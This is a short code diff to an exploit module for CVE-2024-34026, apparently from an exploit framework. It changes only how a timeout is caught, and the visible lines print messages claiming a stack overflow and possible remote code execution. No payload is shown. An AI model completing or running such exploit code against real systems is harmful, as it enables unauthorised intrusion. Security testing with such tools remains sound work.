@@ -146,7 +146,7 @@ class Exploit(Exploit):
                     print_info(f"[CVE-2024-34026] Response ({len(r)} bytes): {r[:32].hex()} — may be patched")
             except ConnectionResetError:
                 print_success("[CVE-2024-34026] Connection reset — stack overflow triggered! RCE possible.")
-            except socket.timeout:
+            except TimeoutError:
                 print_success("[CVE-2024-34026] Timeout — service unresponsive after overflow.")
 
         except Exception as e:
